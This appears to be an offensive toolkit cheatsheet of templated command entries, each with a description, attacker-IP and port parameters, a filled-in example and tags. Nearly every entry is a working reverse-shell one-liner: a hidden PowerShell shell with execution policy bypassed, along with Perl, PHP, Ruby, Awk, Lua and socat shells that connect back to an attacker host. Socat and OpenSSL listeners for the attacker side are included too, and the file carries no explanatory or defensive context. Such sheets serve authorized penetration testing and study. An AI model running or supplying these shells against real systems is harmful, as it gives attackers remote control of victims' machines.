
---
Description :
     PowerShell TCP reverse shell one-liner (Windows victim)

Parameters : #attacker-ip #attacker-port

```cmd
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{{attacker-ip}}',{{attacker-port}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=$r+'PS '+(pwd)+'> ';$sb=([text.encoding]::UTF8).GetBytes($x);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

```example
powershell ... TCPClient('10.10.14.2',4444) ...
```

Tags :  #windows #reverse-shell #powershell #toolkit

---

Description :
     Perl TCP reverse shell (Linux)

Parameters : #attacker-ip #attacker-port

```cmd
perl -e 'use Socket;$i="{{attacker-ip}}";$p={{attacker-port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```example
perl -e 'use Socket;$i="10.10.14.2";$p=4444;...'
```

Tags :  #linux #reverse-shell #perl #toolkit

---

Description :
     Socat listener with TTY (attacker)

Parameters : #attacker-port

```cmd
socat file:`tty`,raw,echo=0 TCP-LISTEN:{{attacker-port}}
```

```example
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

Tags :  #linux #socat #reverse-shell #toolkit

---

Description :
     Socat reverse shell connect (victim has socat)

Parameters : #attacker-ip #attacker-port

```cmd
socat TCP:{{attacker-ip}}:{{attacker-port}} EXEC:/bin/bash
```

```example
socat TCP:10.10.14.2:4444 EXEC:/bin/bash
```

Tags :  #linux #socat #reverse-shell #toolkit

---

Description :
     OpenSSL encrypted reverse shell listener (generate certs first)

Parameters : #attacker-port

```cmd
openssl s_server -quiet -key key.pem -cert cert.pem -port {{attacker-port}}
```

```example
openssl s_server -quiet -key key.pem -cert cert.pem -port 4433
```

Tags :  #linux #openssl #reverse-shell #toolkit

---

Description :
     PHP TCP reverse shell one-liner

Parameters : #attacker-ip #attacker-port

```cmd
php -r '$sock=fsockopen("{{attacker-ip}}",{{attacker-port}});exec("/bin/sh -i <&3 >&3 2>&3");'
```

```example
php -r '$sock=fsockopen("10.10.14.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Tags :  #linux #php #reverse-shell #toolkit

---

Description :
     Ruby TCP reverse shell

Parameters : #attacker-ip #attacker-port

```cmd
ruby -rsocket -e 'c=TCPSocket.new("{{attacker-ip}}","{{attacker-port}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end'
```

```example
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.2","4444");...'
```

Tags :  #linux #ruby #reverse-shell #toolkit

---

Description :
     Awk reverse shell (gawk)

Parameters : #attacker-ip #attacker-port

```cmd
awk 'BEGIN {s="/inet/tcp/0/{{attacker-ip}}/{{attacker-port}}";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

```example
awk 'BEGIN {s="/inet/tcp/0/10.10.14.2/4444";...}'
```

Tags :  #linux #awk #reverse-shell #toolkit

---

Description :
     Lua Linux reverse shell (lua5.1)

Parameters : #attacker-ip #attacker-port

```cmd
lua -e "local s=require('socket');local t=s.tcp();t:connect('{{attacker-ip}}',{{attacker-port}});while true do local r=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;"
```

```example
lua -e "local s=require('socket');...connect('10.10.14.2',4444)..."
```

Tags :  #linux #lua #reverse-shell #toolkit

---
